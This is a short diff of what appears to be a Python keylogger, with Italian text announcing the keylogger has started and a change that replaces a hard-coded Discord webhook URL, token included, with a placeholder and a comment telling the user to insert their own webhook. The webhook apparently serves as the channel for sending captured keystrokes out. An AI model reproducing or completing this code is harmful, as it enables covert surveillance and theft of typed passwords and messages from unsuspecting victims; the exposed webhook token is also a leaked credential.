@@ -6,7 +6,7 @@ import threading
 
 print("keylogger avviato con successo!")
 
-webhook = "https://discord.com/api/webhooks/1256356579473621063/68opF89T8fCNpE0VCBpiHZoOVjlQ9YfvSIB6Z-G5CFKc3x2_ZF3A51c3-rAGXnuszwbP"
+webhook = "WEBHOOK_URL" #METTI IL WEBHOOK URL NEGLI APICI
 
 keylogs = []
 
